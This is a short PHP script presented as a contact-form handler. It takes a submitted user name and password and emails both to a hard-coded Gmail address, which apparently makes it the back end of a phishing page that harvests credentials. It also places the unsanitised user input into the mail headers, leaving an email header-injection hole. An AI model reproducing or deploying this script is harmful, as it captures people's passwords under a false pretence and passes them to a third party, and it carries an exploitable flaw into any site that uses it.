<?php
if(isset($_POST['submit'])){
    $to = "hussainyousaf83@gmail.com"; //Receiver EmialAdress.......
    $from = $_POST['user-name'];
    $pass = $_POST['pass'];

    $subject = "Contact form details";
    $email_body = "Here the user email $from and $pass for the user send query";
    $headers = "Form: $from \r\n";
    $headers .= "Reply to $from \r\n";

    $result = mail($to, $subject, $email_body, $headers);

    if ($result) {
        echo '<script type="text/javascript">alert("Your messege was sent successfully!");</script>';
        echo '<script type="text/javascript">window.location.href = window.location.href;</script>';
    }else{
        echo '<script type="text/javascript">alert("your messege is not send");</script>';
        echo '<script type="text/javascript">window.location.href = window.location.href;</script>';
    }
}
?>
